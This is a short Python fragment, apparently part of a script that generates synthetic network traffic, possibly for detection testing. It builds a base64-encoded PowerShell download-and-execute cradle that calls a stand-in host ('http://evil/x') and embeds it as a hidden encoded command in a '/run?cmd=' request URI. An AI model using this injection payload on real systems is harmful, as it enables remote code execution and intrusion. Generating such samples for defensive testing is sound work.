...
enc=base64.b64encode("IEX(New-Object Net.WebClient).DownloadString('http://evil/x')".encode("utf-16-le")).decode()
uri=("/run?cmd=powershell.exe -nop -w hidden -enc "+enc).encode()
S="10.0.0.66";pkts=[];t=1_700_000_000.0
for i in range(4):
    s=49300+i
